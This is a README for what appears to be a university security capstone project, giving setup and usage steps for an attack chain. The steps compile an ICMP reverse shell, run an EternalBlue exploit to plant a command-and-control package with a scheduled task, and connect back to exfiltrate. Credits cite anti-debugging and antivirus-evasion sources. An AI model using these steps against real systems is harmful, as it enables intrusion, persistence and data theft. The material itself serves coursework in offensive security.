# CS564 - Capstone Project

---

## Requirement

-   Linux host (we used the provided VM of Ubuntu)
-   Python 2.7
    -   [Installer (python.org)](https://www.python.org/downloads/release/python-2718/)
    -   [Pip installer](https://bootstrap.pypa.io/pip/2.7/get-pip.py)
    -   `impacket`: Run `python2 -m pip install impacket`
-   Python 3
-   Visual C++ 2008 compiler.
    -   [Installer (archive.org)](https://web.archive.org/web/20210106040224/https://download.microsoft.com/download/7/9/6/796EF2E4-801B-4FC4-AB28-B59FBF6D907B/VCForPython27.msi)

## Generating payload

We prepare a C2 package that communicates through ICMP protocol.

### Remote shell

To compile remote shell,
open Visual C++ 2008 32/64-bit Command Prompt, and type the
following. Remember to change `MY_IP` to the IP of commander.

```
cl.exe icmpsh-s.patch.c /D"MY_IP=\"192.168.191.128\""
```

### Python code

Pack it into EXE

## Infiltrate

Inside folder, `eBlue.py` is the exploit. Run

```
python2 eBlue.py 169.254.16.129
```

After running, the C2 package should now be stored inside the target system.
Additionally, a scheduled task is made to execute C2 in the future.

## Exfil

Due to the protocol limitation, we need to connect using Linux system and
run the following command to disable automatic ICMP reply.

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
```

When the schedule task run, in order to connect,
execute on our host:

```
python3 icmpsh_m3.py 169.254.16.130 169.254.16.129
```


## Credits

-   `icmpsh-s.patch.c` and `icmpsh-m3.py` is based on [bdamele:icmpsh](https://github.com/bdamele/icmpsh)
-   `eBlue.py` from [Exploit-DB](https://www.exploit-db.com/exploits/42315)
-   Anti-debug techniques from [Anti-Debug Tricks](https://anti-debug.checkpoint.com/)
-   C obfuscation from [scrt:avcleaner](https://github.com/scrt/avcleaner)
